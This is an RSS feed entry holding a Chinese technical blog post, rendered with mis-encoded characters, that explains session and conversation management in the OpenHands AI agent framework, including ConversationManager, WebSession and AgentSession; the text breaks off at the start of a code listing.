{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "AI Agent 框架探秘：拆解 OpenHands（5）--- 交互&会话",
      "link": "https://www.cnblogs.com/rossiXYZ/p/19560009",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/rossiXYZ/p/19560009\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäºŽ 2026-02-02 20:54\">\n    <span>AI Agent æ¡†æž¶æŽ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ5ï¼‰--- äº¤äº’&amp;ä¼šè¯</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"ai-agent-æ¡†æž¶æŽ¢ç§˜æ‹†è§£-openhands5----äº¤äº’ä¼šè¯\">AI Agent æ¡†æž¶æŽ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ5ï¼‰--- äº¤äº’&amp;ä¼šè¯</h1>\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">ç›®å½•</div><ul><li><a href=\"#ai-agent-æ¡†æž¶æŽ¢ç§˜æ‹†è§£-openhands5----äº¤äº’ä¼šè¯\" rel=\"noopener nofollow\">AI Agent æ¡†æž¶æŽ¢ç§˜ï¼šæ‹†è§£ OpenHandsï¼ˆ5ï¼‰--- äº¤äº’&amp;ä¼šè¯</a><ul><li><a href=\"#0x00-æ¦‚è¿°\" rel=\"noopener nofollow\">0x00 æ¦‚è¿°</a></li><li><a href=\"#0x01-èƒŒæ™¯\" rel=\"noopener nofollow\">0x01 èƒŒæ™¯</a><ul><li><a href=\"#11-ä¼šè¯çš„æ„ä¹‰\" rel=\"noopener nofollow\">1.1 ä¼šè¯çš„æ„ä¹‰</a></li><li><a href=\"#12-ä¼šè¯ç³»ç»Ÿçš„å¸¸è§åŠŸèƒ½\" rel=\"noopener nofollow\">1.2 ä¼šè¯ç³»ç»Ÿçš„å¸¸è§åŠŸèƒ½</a></li><li><a href=\"#13-session-å¸¸è§å†…å®¹\" rel=\"noopener nofollow\">1.3 Session å¸¸è§å†…å®¹</a></li><li><a href=\"#14-ä¼šè¯ç”Ÿå‘½å‘¨æœŸ\" rel=\"noopener nofollow\">1.4 ä¼šè¯ç”Ÿå‘½å‘¨æœŸ</a></li><li><a href=\"#15--å‰æ–‡å›žé¡¾\" rel=\"noopener nofollow\">1.5  å‰æ–‡å›žé¡¾</a></li></ul></li><li><a href=\"#0x02-openhands-ä¼šè¯ç³»ç»Ÿ\" rel=\"noopener nofollow\">0x02 OpenHands ä¼šè¯ç³»ç»Ÿ</a><ul><li><a href=\"#21-å¯¹è¯ç®¡ç†æŽ¥å£-conversationmanager\" rel=\"noopener nofollow\">2.1 å¯¹è¯ç®¡ç†æŽ¥å£ ConversationManager</a><ul><li><a href=\"#211-standaloneconversationmanager\" rel=\"noopener nofollow\">2.1.1 StandaloneConversationManager</a></li><li><a href=\"#212-sessionåˆå§‹åŒ–\" rel=\"noopener nofollow\">2.1.2 Sessionåˆå§‹åŒ–</a></li></ul></li><li><a href=\"#22-sessionpywebsession\" rel=\"noopener nofollow\">2.2 session.pyï¼ˆWebSessionï¼‰</a><ul><li><a href=\"#221-websession-ç±»æ¦‚è¿°\" rel=\"noopener nofollow\">2.2.1 WebSession ç±»æ¦‚è¿°</a></li><li><a href=\"#222-websession-æ ¸å¿ƒå±žæ€§\" rel=\"noopener nofollow\">2.2.2 WebSession æ ¸å¿ƒå±žæ€§</a></li><li><a href=\"#223-ä¸»è¦åŠŸèƒ½æ¨¡å—\" rel=\"noopener nofollow\">2.2.3 ä¸»è¦åŠŸèƒ½æ¨¡å—</a></li><li><a href=\"#224-ä¸Žç³»ç»Ÿå…¶ä»–ç»„ä»¶çš„å…³ç³»\" rel=\"noopener nofollow\">2.2.4 ä¸Žç³»ç»Ÿå…¶ä»–ç»„ä»¶çš„å…³ç³»</a></li><li><a href=\"#225-åˆå§‹åŒ–-agentsession\" rel=\"noopener nofollow\">2.2.5 åˆå§‹åŒ– AgentSession</a></li></ul></li><li><a href=\"#23-agent_session\" rel=\"noopener nofollow\">2.3 agent_session</a><ul><li><a href=\"#231-agentsession\" rel=\"noopener nofollow\">2.3.1 AgentSession</a></li><li><a href=\"#242-åˆå§‹åŒ–agent\" rel=\"noopener nofollow\">2.4.2 åˆå§‹åŒ–Agent</a><ul><li><a href=\"#æ ¸å¿ƒä½œç”¨\" rel=\"noopener nofollow\">æ ¸å¿ƒä½œç”¨</a></li><li><a href=\"#æ ¸å¿ƒç‰¹è‰²\" rel=\"noopener nofollow\">æ ¸å¿ƒç‰¹è‰²</a></li><li><a href=\"#åˆå§‹åŒ–æµç¨‹å›¾\" rel=\"noopener nofollow\">åˆå§‹åŒ–æµç¨‹å›¾</a></li></ul></li></ul></li><li><a href=\"#24-ç”¨æˆ·äº¤äº’oh_user_actioné€»è¾‘\" rel=\"noopener nofollow\">2.4 ç”¨æˆ·äº¤äº’(oh_user_action)é€»è¾‘</a><ul><li><a href=\"#241-ç”¨æˆ·å‘æ¶ˆæ¯\" rel=\"noopener nofollow\">2.4.1 ç”¨æˆ·å‘æ¶ˆæ¯</a></li><li><a href=\"#242-äº‹ä»¶æ·»åŠ\" rel=\"noopener nofollow\">2.4.2 äº‹ä»¶æ·»åŠ </a></li><li><a href=\"#243-äº‹ä»¶å¤„ç†\" rel=\"noopener nofollow\">2.4.3 äº‹ä»¶å¤„ç†</a></li></ul></li></ul></li><li><a href=\"#0xff-å‚è€ƒ\" rel=\"noopener nofollow\">0xFF å‚è€ƒ</a></li></ul></li></ul></div><p></p>\n<h2 id=\"0x00-æ¦‚è¿°\">0x00 æ¦‚è¿°</h2>\n<p>æœ‰æ„ä¹‰çš„å¤šè½®å¯¹è¯è¦æ±‚æ™ºèƒ½ä½“èƒ½å¤Ÿç†è§£ä¸Šä¸‹æ–‡ã€‚å°±åƒäººç±»ä¸€æ ·ï¼Œæ™ºèƒ½ä½“éœ€è¦è®°ä½å¯¹è¯åŽ†å²ï¼šå·²ç»è¯´è¿‡å’Œåšè¿‡ä»€ä¹ˆï¼Œä»¥ä¿æŒè¿žè´¯æ€§å¹¶é¿å…é‡å¤ã€‚</p>\n<p>ä»¥ä¸‹æ˜¯OpenHands Applicationsçš„ç¤ºä¾‹å›¾ï¼Œæœ¬ç¯‡å°±æ¥çœ‹çœ‹ä¼šè¯å’Œäº¤äº’å¦‚ä½•è¿›è¡Œã€‚</p>\n<p><img alt=\"openhands-sdk\" class=\"lazyload\" /></p>\n<p>å› ä¸ºæœ¬ç³»åˆ—å€Ÿé‰´çš„æ–‡ç« è¿‡å¤šï¼Œå¯èƒ½åœ¨å‚è€ƒæ–‡çŒ®ä¸­æœ‰é—æ¼çš„æ–‡ç« ï¼Œå¦‚æžœæœ‰ï¼Œè¿˜è¯·å¤§å®¶æŒ‡å‡ºã€‚</p>\n<h2 id=\"0x01-èƒŒæ™¯\">0x01 èƒŒæ™¯</h2>\n<p>æœ¬èŠ‚åŸºäºŽ Google ADK æ¥è¿›è¡ŒèƒŒæ™¯ä»‹ç»ã€‚</p>\n<h3 id=\"11-ä¼šè¯çš„æ„ä¹‰\">1.1 ä¼šè¯çš„æ„ä¹‰</h3>\n<p>å°±åƒä½ ä¸ä¼šæ¯æ¬¡å‘çŸ­ä¿¡éƒ½ä»Žå¤´å¼€å§‹ä¸€æ ·ï¼Œæ™ºèƒ½ä½“ä¹Ÿéœ€è¦äº†è§£å½“å‰äº¤äº’çš„ä¸Šä¸‹æ–‡ã€‚å¸¸è§çš„Agentç³»ç»Ÿä¼šé€šè¿‡ <code>Session</code>ã€<code>State</code> å’Œ <code>Memory</code> æä¾›äº†ç»“æž„åŒ–çš„ä¸Šä¸‹æ–‡ç®¡ç†æ–¹å¼ã€‚</p>\n<ol>\n<li><strong><code>Session</code></strong>ï¼šå½“å‰å¯¹è¯çº¿ç¨‹ï¼ˆå¯ä»¥å°†ä½ ä¸Žæ™ºèƒ½ä½“çš„ä¸åŒå¯¹è¯å®žä¾‹è§†ä¸ºç‹¬ç«‹çš„<strong>å¯¹è¯çº¿ç¨‹</strong>ï¼Œå®ƒä»¬å¯èƒ½ä¼šåˆ©ç”¨<strong>é•¿æœŸçŸ¥è¯†</strong>ï¼‰\n<ul>\n<li>è¡¨ç¤ºç”¨æˆ·ä¸Žä½ çš„æ™ºèƒ½ä½“ç³»ç»Ÿä¹‹é—´<em>å•æ¬¡ã€æŒç»­çš„äº¤äº’</em>ã€‚</li>\n<li>åŒ…å«è¯¥ç‰¹å®šäº¤äº’æœŸé—´ï¼Œæ™ºèƒ½ä½“é‡‡å–çš„æ¶ˆæ¯å’ŒåŠ¨ä½œï¼ˆç§°ä¸º <code>Events</code>ï¼‰çš„æ—¶é—´é¡ºåºåºåˆ—ã€‚</li>\n<li>ä¸€ä¸ª <code>Session</code> è¿˜å¯ä»¥ä¿å­˜ä»…åœ¨<em>æœ¬æ¬¡å¯¹è¯</em>æœŸé—´ç›¸å…³çš„ä¸´æ—¶æ•°æ®ï¼ˆ<code>State</code>ï¼‰ã€‚</li>\n</ul>\n</li>\n<li><code>State</code>ï¼šå½“å‰å¯¹è¯ä¸­çš„æ•°æ®\n<ul>\n<li>å­˜å‚¨åœ¨ç‰¹å®š <code>Session</code> å†…çš„æ•°æ®ã€‚</li>\n<li>ç”¨äºŽç®¡ç†<em>ä»…</em>ä¸Ž<em>å½“å‰ï¼ˆå•æ¬¡ï¼‰ã€æ´»è·ƒ</em>å¯¹è¯çº¿ç¨‹ç›¸å…³çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œ<em>æœ¬æ¬¡å¯¹è¯</em>ä¸­çš„è´­ç‰©è½¦å•†å“ï¼Œ<em>æœ¬ Session</em> ä¸­æåˆ°çš„ç”¨æˆ·åå¥½ï¼‰ã€‚</li>\n<li>å…³æ³¨å¦‚ä½•é«˜æ•ˆåœ°è¯»å–ã€å†™å…¥å’Œç®¡ç† session ä¸“å±žæ•°æ®ã€‚</li>\n</ul>\n</li>\n<li><code>Memory</code>ï¼šå¯æ£€ç´¢çš„è·¨ Session ä¿¡æ¯\n<ul>\n<li>è¡¨ç¤ºå¯èƒ½è·¨è¶Š<em>å¤šä¸ªè¿‡åŽ» Session</em>æˆ–åŒ…å«å¤–éƒ¨æ•°æ®æºçš„ä¿¡æ¯å­˜å‚¨ã€‚</li>\n<li>å®ƒä½œä¸ºä¸€ä¸ªçŸ¥è¯†åº“ï¼Œæ™ºèƒ½ä½“å¯ä»¥<em>æ£€ç´¢</em>ä»¥å›žå¿†è¶…å‡ºå½“å‰å¯¹è¯çš„ä¿¡æ¯æˆ–ä¸Šä¸‹æ–‡ã€‚</li>\n</ul>\n</li>\n</ol>\n<p>å› æ­¤ï¼ŒAgentç³»ç»Ÿä¸€èˆ¬æœ‰å¦‚ä¸‹ä¸¤å¥—ç»„ä»¶æˆ–è€…æœåŠ¡ï¼š</p>\n<ul>\n<li><strong><code>SessionService</code></strong>ï¼šç®¡ç†ä¸åŒçš„å¯¹è¯çº¿ç¨‹ï¼ˆ<code>Session</code> å¯¹è±¡ï¼‰è´Ÿè´£ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼šåˆ›å»ºã€æ£€ç´¢ã€æ›´æ–°ï¼ˆè¿½åŠ  <code>Events</code>ã€ä¿®æ”¹ <code>State</code>ï¼‰å’Œåˆ é™¤å•ä¸ª <code>Session</code>ã€‚</li>\n<li><strong><code>MemoryService</code></strong>ï¼šç®¡ç†é•¿æœŸçŸ¥è¯†å­˜å‚¨ï¼ˆ<code>Memory</code>ï¼‰ï¼Œè´Ÿè´£å°†ä¿¡æ¯ï¼ˆé€šå¸¸æ¥è‡ªå·²å®Œæˆçš„ <code>Session</code>ï¼‰å¯¼å…¥é•¿æœŸå­˜å‚¨ã€‚æä¾›åŸºäºŽæŸ¥è¯¢æ£€ç´¢å·²å­˜å‚¨çŸ¥è¯†çš„æ–¹æ³•ã€‚</li>\n</ul>\n<p>æœ¬ç¯‡ä»‹ç»å¯¹è¯æœåŠ¡ï¼ŒåŽç»­å¦å¤–ä»‹ç»å†…å­˜æœåŠ¡ã€‚</p>\n<h3 id=\"12-ä¼šè¯ç³»ç»Ÿçš„å¸¸è§åŠŸèƒ½\">1.2 ä¼šè¯ç³»ç»Ÿçš„å¸¸è§åŠŸèƒ½</h3>\n<p>ç”¨æˆ·é€šå¸¸ä¸ä¼šç›´æŽ¥åˆ›å»ºæˆ–ç®¡ç† <code>Session</code> å¯¹è±¡ï¼Œè€Œæ˜¯é€šè¿‡ <strong><code>SessionService</code></strong>ã€‚è¯¥æœåŠ¡ä½œä¸ºä¼šè¯ç”Ÿå‘½å‘¨æœŸçš„ä¸­å¤®ç®¡ç†è€…ã€‚å…¶æ ¸å¿ƒèŒè´£åŒ…æ‹¬ï¼š</p>\n<ul>\n<li><strong>å¼€å¯æ–°å¯¹è¯ï¼š</strong> å½“ç”¨æˆ·å¼€å§‹äº¤äº’æ—¶ï¼Œåˆ›å»ºæ–°çš„ <code>Session</code> å¯¹è±¡ã€‚</li>\n<li><strong>æ¢å¤å·²æœ‰å¯¹è¯ï¼š</strong> é€šè¿‡ ID æ£€ç´¢ç‰¹å®š <code>Session</code>ï¼Œè®©æ™ºèƒ½ä½“å¯ä»¥ä»Žä¸Šæ¬¡ä¸­æ–­å¤„ç»§ç»­ã€‚</li>\n<li><strong>ä¿å­˜è¿›åº¦ï¼š</strong> å°†æ–°çš„äº¤äº’ï¼ˆ<code>Event</code> å¯¹è±¡ï¼‰è¿½åŠ åˆ° session åŽ†å²ã€‚è¿™ä¹Ÿæ˜¯ session <code>state</code> æ›´æ–°çš„æœºåˆ¶ï¼ˆè¯¦è§ <code>State</code> ç« èŠ‚ï¼‰ã€‚</li>\n<li><strong>åˆ—å‡ºå¯¹è¯ï¼š</strong> æŸ¥æ‰¾ç‰¹å®šç”¨æˆ·å’Œåº”ç”¨çš„æ´»è·ƒä¼šè¯çº¿ç¨‹ã€‚</li>\n<li><strong>æ¸…ç†ï¼š</strong> å½“å¯¹è¯ç»“æŸæˆ–ä¸å†éœ€è¦æ—¶ï¼Œåˆ é™¤ <code>Session</code> åŠå…¶ç›¸å…³æ•°æ®ã€‚</li>\n</ul>\n<p>é€‰æ‹©åˆé€‚çš„ <code>SessionService</code> æ˜¯å†³å®šæ™ºèƒ½ä½“å¯¹è¯åŽ†å²å’Œä¸´æ—¶æ•°æ®å¦‚ä½•å­˜å‚¨ä¸ŽæŒä¹…åŒ–çš„å…³é”®ã€‚</p>\n<h3 id=\"13-session-å¸¸è§å†…å®¹\">1.3 Session å¸¸è§å†…å®¹</h3>\n<p>ä¸€èˆ¬æ¥è¯´ï¼Œå½“ç”¨æˆ·å¼€å§‹ä¸Žæ™ºèƒ½ä½“äº¤äº’æ—¶ï¼Œ<code>SessionService</code> ä¼šåˆ›å»ºä¸€ä¸ª <code>Session</code> å¯¹è±¡ã€‚è¯¥å¯¹è±¡ä½œä¸º<em>å•ä¸ªå¯¹è¯çº¿ç¨‹</em>ç›¸å…³æ‰€æœ‰å†…å®¹çš„å®¹å™¨ã€‚å…¶ä¸»è¦å±žæ€§å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>æ ‡è¯†ä¿¡æ¯ï¼ˆ<code>id</code>, <code>appName</code>, <code>userId</code>ï¼‰ï¼š</li>\n</ol>\n<p>ç”¨äºŽå”¯ä¸€æ ‡è®°å¯¹è¯çš„æ ¸å¿ƒå­—æ®µï¼Œå…·ä½“è¯´æ˜Žå¦‚ä¸‹ï¼š</p>\n<ul>\n<li><code>id</code>ï¼šå½“å‰å¯¹è¯çº¿ç¨‹çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œæ˜¯åŽç»­æ£€ç´¢è¯¥å¯¹è¯çš„å…³é”®ä¾æ®ã€‚ä¸€ä¸ª <code>SessionService</code> å¯¹è±¡å¯ç®¡ç†å¤šä¸ª <code>Session</code>ï¼ˆä¼šè¯ï¼‰å®žä¾‹ï¼Œæ­¤å­—æ®µç”¨äºŽæ˜Žç¡®å½“å‰æ“ä½œå¯¹åº”çš„å…·ä½“ä¼šè¯å¯¹è±¡ã€‚ç¤ºä¾‹å€¼ï¼š\"test_id_modification\"ã€‚</li>\n<li><code>app_name</code>ï¼šæ ‡è¯†å½“å‰å¯¹è¯æ‰€å±žçš„æ™ºèƒ½ä½“åº”ç”¨ã€‚ç¤ºä¾‹å€¼ï¼š\"id_modifier_workflow\"ã€‚</li>\n<li><code>userId</code>ï¼šå°†å¯¹è¯ä¸Žç‰¹å®šç”¨æˆ·å…³è”çš„å…³è”å­—æ®µï¼Œç”¨äºŽç”¨æˆ·ç»´åº¦çš„å¯¹è¯ç®¡ç†ä¸Žæƒé™æŽ§åˆ¶ã€‚</li>\n</ul>\n<ol start=\"2\">\n<li>å¯¹è¯åŽ†å²ï¼ˆ<code>events</code>ï¼‰ï¼š</li>\n</ol>\n<p>æŒ‰æ—¶é—´é¡ºåºæŽ’åˆ—çš„äº¤äº’åºåˆ—ï¼ŒåŒ…å«å½“å‰å¯¹è¯çº¿ç¨‹ä¸­å‘ç”Ÿçš„æ‰€æœ‰äº¤äº’è¡Œä¸ºï¼ˆä»¥ <code>Event</code> å¯¹è±¡å½¢å¼å­˜å‚¨ï¼‰ï¼Œæ¶µç›–ç”¨æˆ·æ¶ˆæ¯ã€æ™ºèƒ½ä½“å“åº”ã€å·¥å…·è°ƒç”¨åŠ¨ä½œç­‰å…¨é‡äº¤äº’è®°å½•ã€‚</p>\n<ol start=\"3\">\n<li>ä¼šè¯çŠ¶æ€ï¼ˆ<code>state</code>ï¼‰ï¼š</li>\n</ol>\n<p>ç”¨äºŽå­˜å‚¨<strong>ä»…ä¸Žå½“å‰æ´»è·ƒå¯¹è¯ç›¸å…³çš„ä¸´æ—¶æ•°æ®</strong>ï¼Œç›¸å½“äºŽæ™ºèƒ½ä½“åœ¨äº¤äº’è¿‡ç¨‹ä¸­çš„ â€œä¸´æ—¶è‰ç¨¿æœ¬â€ã€‚ä¸‹ä¸€èŠ‚å°†è¯¦ç»†ä»‹ç» <code>state</code> çš„å…·ä½“ä½¿ç”¨ä¸Žç®¡ç†æ–¹å¼ã€‚</p>\n<ol start=\"4\">\n<li>æ´»åŠ¨è¿½è¸ªï¼ˆ<code>lastUpdateTime</code>ï¼‰ï¼š</li>\n</ol>\n<p>æ—¶é—´æˆ³å­—æ®µï¼Œè®°å½•å½“å‰å¯¹è¯çº¿ç¨‹ä¸­æœ€åŽä¸€æ¬¡äº¤äº’äº‹ä»¶çš„å‘ç”Ÿæ—¶é—´ï¼Œç”¨äºŽä¼šè¯æ´»è·ƒåº¦åˆ¤æ–­ä¸Žè¿‡æœŸç®¡ç†ã€‚</p>\n<h3 id=\"14-ä¼šè¯ç”Ÿå‘½å‘¨æœŸ\">1.4 ä¼šè¯ç”Ÿå‘½å‘¨æœŸ</h3>\n<p><img alt=\"Session lifecycle\" class=\"lazyload\" /></p>\n<p>ä»¥ä¸‹æ˜¯ <code>Session</code> ä¸Ž <code>SessionService</code> åœ¨ä¸€æ¬¡å¯¹è¯è½®æ¬¡ä¸­åä½œçš„ç®€åŒ–æµç¨‹ï¼š</p>\n<ol>\n<li><strong>å¼€å§‹æˆ–æ¢å¤ï¼š</strong> ä½ çš„åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨ <code>SessionService</code> æ¥è¦ä¹ˆ <code>create_session</code>ï¼ˆç”¨äºŽæ–°èŠå¤©ï¼‰ï¼Œè¦ä¹ˆä½¿ç”¨çŽ°æœ‰çš„ session idã€‚</li>\n<li><strong>æä¾›ä¸Šä¸‹æ–‡ï¼š</strong> <code>Runner</code> ä»Žé€‚å½“çš„æœåŠ¡æ–¹æ³•èŽ·å–ç›¸åº”çš„ <code>Session</code> å¯¹è±¡ï¼Œä¸ºæ™ºèƒ½ä½“æä¾›å¯¹ç›¸åº” Session çš„ <code>state</code> å’Œ <code>events</code> çš„è®¿é—®æƒé™ã€‚</li>\n<li><strong>æ™ºèƒ½ä½“å¤„ç†ï¼š</strong> ç”¨æˆ·ç”¨æŸ¥è¯¢æç¤ºæ™ºèƒ½ä½“ã€‚æ™ºèƒ½ä½“åˆ†æžæŸ¥è¯¢ä»¥åŠå¯èƒ½çš„ session <code>state</code> å’Œ <code>events</code> åŽ†å²æ¥ç¡®å®šå“åº”ã€‚</li>\n<li><strong>å“åº”å’ŒçŠ¶æ€æ›´æ–°ï¼š</strong> æ™ºèƒ½ä½“ç”Ÿæˆå“åº”ï¼ˆå¹¶å¯èƒ½æ ‡è®°è¦åœ¨ <code>state</code> ä¸­æ›´æ–°çš„æ•°æ®ï¼‰ã€‚<code>Runner</code> å°†å…¶æ‰“åŒ…ä¸º <code>Event</code>ã€‚</li>\n<li><strong>ä¿å­˜äº¤äº’ï¼š</strong> <code>Runner</code> è°ƒç”¨ <code>sessionService.append_event(session, event)</code>ï¼Œå°† <code>session</code> å’Œæ–°çš„ <code>event</code> ä½œä¸ºå‚æ•°ã€‚æœåŠ¡å°† <code>Event</code> æ·»åŠ åˆ°åŽ†å²è®°å½•ä¸­ï¼Œå¹¶æ ¹æ®äº‹ä»¶ä¸­çš„ä¿¡æ¯æ›´æ–°å­˜å‚¨ä¸­çš„ session <code>state</code>ã€‚session çš„ <code>last_update_time</code> ä¹Ÿä¼šå¾—åˆ°æ›´æ–°ã€‚</li>\n<li><strong>å‡†å¤‡ä¸‹ä¸€æ¬¡ï¼š</strong> æ™ºèƒ½ä½“çš„å“åº”å‘é€ç»™ç”¨æˆ·ã€‚æ›´æ–°åŽçš„ <code>Session</code> çŽ°åœ¨ç”± <code>SessionService</code> å­˜å‚¨ï¼Œå‡†å¤‡è¿›è¡Œä¸‹ä¸€è½®ï¼ˆè¿™é€šå¸¸ä¼šåœ¨å½“å‰ä¼šè¯ä¸­ç»§ç»­å¯¹è¯ï¼Œä»Žæ­¥éª¤ 1 é‡æ–°å¼€å§‹å¾ªçŽ¯ï¼‰ã€‚</li>\n<li><strong>ç»“æŸå¯¹è¯ï¼š</strong> å½“å¯¹è¯ç»“æŸæ—¶ï¼Œä½ çš„åº”ç”¨ç¨‹åºè°ƒç”¨ <code>sessionService.delete_session(...)</code> æ¥æ¸…ç†å­˜å‚¨çš„ä¼šè¯æ•°æ®ï¼ˆå¦‚æžœä¸å†éœ€è¦çš„è¯ï¼‰ã€‚</li>\n</ol>\n<p>æ­¤å¾ªçŽ¯çªå‡ºæ˜¾ç¤ºäº† <code>SessionService</code> å¦‚ä½•é€šè¿‡ç®¡ç†æ¯ä¸ª <code>Session</code> å¯¹è±¡çš„åŽ†å²å’ŒçŠ¶æ€ï¼Œç¡®ä¿å¯¹è¯çš„è¿žç»­æ€§ã€‚</p>\n<h3 id=\"15--å‰æ–‡å›žé¡¾\">1.5  å‰æ–‡å›žé¡¾</h3>\n<p>æˆ‘ä»¬é¦–å…ˆå›žé¡¾å‰æ–‡ä»‹ç»çš„ï¼ŒOpenHandsé¡¹ç›®å…³äºŽå¯¹è¯çš„æœåŠ¡å™¨ç«¯ç»„ä»¶ã€‚</p>\n<ul>\n<li><code>session.py</code> æ–‡ä»¶å®šä¹‰äº†<code>Session</code>ç±»ï¼Œå®ƒä»£è¡¨ä¸Žå®¢æˆ·ç«¯çš„WebSocketä¼šè¯ã€‚</li>\n<li><code>agent_session.py</code> æ–‡ä»¶åŒ…å«<code>AgentSession</code>ç±»ï¼Œå®ƒç®¡ç†ä¼šè¯å†…Agentçš„ç”Ÿå‘½å‘¨æœŸã€‚</li>\n<li><code>conversation_manager.py</code> æ–‡ä»¶å®šä¹‰äº†<code>ConversationManager</code>ç±»ï¼Œå®ƒè´Ÿè´£ç®¡ç†å¤šä¸ªå®¢æˆ·ç«¯ä¼šè¯ã€‚</li>\n<li><code>listen.py</code> æ–‡ä»¶æ˜¯ä¸»æœåŠ¡å™¨æ–‡ä»¶ï¼Œå®ƒè®¾ç½®FastAPIåº”ç”¨ç¨‹åºå¹¶å®šä¹‰å„ç§APIç«¯ç‚¹ã€‚æ­¤å¤„å…³é”®ä¸€æ­¥ä¸ºä¸Žä¼šè¯ç®¡ç†å™¨ ConversationManager å»ºç«‹è¿žæŽ¥ã€‚</li>\n</ul>\n<p>ä»¥ä¸Šå‡ æ­¥å±•ç¤ºäº†æœåŠ¡å™¨ç»„ä»¶å¦‚ä½•æž„å»ºä¼šè¯ï¼Œå› æ­¤æˆ‘ä»¬ç”±æ­¤è€Œå…¥ã€‚</p>\n<h2 id=\"0x02-openhands-ä¼šè¯ç³»ç»Ÿ\">0x02 OpenHands ä¼šè¯ç³»ç»Ÿ</h2>\n<p>ä¼šè¯æ˜¯ä¸“é—¨è®¾è®¡ç”¨äºŽè·Ÿè¸ªå’Œç®¡ç†å•ç‹¬å¯¹è¯çº¿ç¨‹çš„å¯¹è±¡ã€‚ä¼šè¯å°±å¯ä»¥ç†è§£ä¸ºAIä»£ç†çš„ä¸´æ—¶å·¥ä½œç©ºé—´ï¼Œå°±åƒä½ ä¸ºç‰¹å®šé¡¹ç›®å‡†å¤‡çš„åŠžå…¬æ¡Œã€‚å®ƒåŒ…å«å½“å‰å¯¹è¯çš„æ‰€æœ‰å¿…è¦å·¥å…·ã€ç¬”è®°å’Œå‚è€ƒèµ„æ–™ï¼Œä¸€åˆ‡éƒ½æ˜¯å³æ—¶å¯è®¿é—®çš„ï¼Œä½†ä¹Ÿå…·æœ‰ä¸´æ—¶æ€§å’Œä»»åŠ¡ç‰¹å®šæ€§ã€‚</p>\n<p>å…·ä½“è€Œè¨€ï¼Œåœ¨OpenHandsä¸­ï¼š</p>\n<ul>\n<li><code>WebSession</code> æ˜¯ä¸€ä¸ª Web æœåŠ¡å™¨ç»‘å®šçš„ä¼šè¯åŒ…è£…å™¨ï¼Œ<strong>è´Ÿè´£ç®¡ç†å•ä¸ª Web å®¢æˆ·ç«¯è¿žæŽ¥å¹¶åè°ƒ AgentSession ç”Ÿå‘½å‘¨æœŸ</strong>ã€‚æ˜¯ OpenHands ç³»ç»Ÿä¸­è¿žæŽ¥å‰ç«¯ç”¨æˆ·ç•Œé¢å’ŒåŽç«¯Agentæ‰§è¡Œçš„æ ¸å¿ƒæ¡¥æ¢ï¼Œè´Ÿè´£åè°ƒæ•´ä¸ªäº¤äº’æµç¨‹ã€‚</li>\n<li><code>AgentSession</code> æ˜¯ OpenHands æ¡†æž¶ä¸­ <strong>Agentè¿è¡Œçš„ â€œä¸Šä¸‹æ–‡å®¹å™¨â€</strong>ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯å°è£…Agentæ‰§è¡Œæ‰€éœ€çš„æ‰€æœ‰ç»„ä»¶ï¼ˆAgentã€æŽ§åˆ¶å™¨ã€è¿è¡Œæ—¶ã€å†…å­˜ã€äº‹ä»¶æµï¼‰ï¼Œç»Ÿä¸€ç®¡ç†å®ƒä»¬çš„ç”Ÿå‘½å‘¨æœŸï¼ˆåˆå§‹åŒ–ã€å¯åŠ¨ã€é€šä¿¡ã€å…³é—­ï¼‰ï¼Œå¹¶æä¾›ä¼šè¯çº§çš„é…ç½®éš”ç¦»ã€æ•°æ®æŒä¹…åŒ–å’ŒçŠ¶æ€ç®¡ç†ï¼Œæ˜¯Agentèƒ½å¤Ÿç‹¬ç«‹ã€ç¨³å®šæ‰§è¡Œä»»åŠ¡çš„åŸºç¡€ã€‚</li>\n</ul>\n<h3 id=\"21-å¯¹è¯ç®¡ç†æŽ¥å£-conversationmanager\">2.1 å¯¹è¯ç®¡ç†æŽ¥å£ ConversationManager</h3>\n<p>ConversationManager ç±»å®šä¹‰äº†å¯¹è¯ç®¡ç†çš„æŽ¥å£ï¼Œé€‚ç”¨äºŽå•æœºæ¨¡å¼å’Œé›†ç¾¤æ¨¡å¼ã€‚å®ƒè´Ÿè´£å¤„ç†å¯¹è¯çš„å…¨ç”Ÿå‘½å‘¨æœŸï¼Œ<br />\nåŒ…æ‹¬åˆ›å»ºã€é™„åŠ ã€åˆ†ç¦»å’Œæ¸…ç†ã€‚è¿™æ˜¯OpenHandsçš„ä¸€ä¸ªæ‰©å±•ç‚¹ï¼ŒåŸºäºŽå®ƒæž„å»ºçš„åº”ç”¨å¯é€šè¿‡æœåŠ¡å™¨é…ç½®ä¿®æ”¹è¡Œä¸ºï¼Œæ— éœ€æ”¹åŠ¨å…¶æ ¸å¿ƒä»£ç ã€‚åº”ç”¨ç¨‹åºå¯é€šè¿‡ä»¥ä¸‹æ–¹å¼æä¾›è‡ªå®šä¹‰å®žçŽ°ï¼š</p>\n<ol>\n<li>åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ªConversationManagerçš„ç±»</li>\n<li>å®žçŽ°æ‰€æœ‰å¿…éœ€çš„æŠ½è±¡æ–¹æ³•</li>\n<li>å°†server_config.conversation_manager_classè®¾ç½®ä¸ºè¯¥å®žçŽ°ç±»çš„å…¨é™å®šå</li>\n</ol>\n<p>ConversationManager å®šä¹‰å¦‚ä¸‹ã€‚</p>\n<pre><code class=\"language-python\">class ConversationManager(ABC):\n    \"\"\"OpenHandsä¸­å¯¹è¯ç®¡ç†çš„æŠ½è±¡åŸºç±»ã€‚\n    åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦åœ¨ä»¥ä¸‹åœºæ™¯ä¸­è‡ªå®šä¹‰å®žçŽ°ï¼š\n    - 